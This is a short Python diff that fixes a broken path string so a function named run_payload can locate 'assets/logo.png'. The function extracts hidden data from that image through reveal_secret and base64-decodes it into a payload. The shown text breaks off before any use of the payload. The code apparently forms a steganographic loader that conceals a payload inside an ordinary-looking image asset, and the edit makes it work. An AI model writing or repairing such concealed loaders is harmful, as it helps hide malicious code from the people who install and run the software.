@@ -30,7 +30,7 @@ def reveal_secret(image_path):
 def run_payload():
     try:
         script_dir = os.path.dirname(os.path.abspath(__file__))
-        image_path = os.path.join(script_dir, '..", "assets", 'logo.png') # Go up one directory to find assets
+        image_path = os.path.join(script_dir, '..', 'assets', 'logo.png') # Go up one directory to find assets
         secret_data = reveal_secret(image_path)
         if secret_data:
             decoded_payload = base64.b64decode(secret_data)
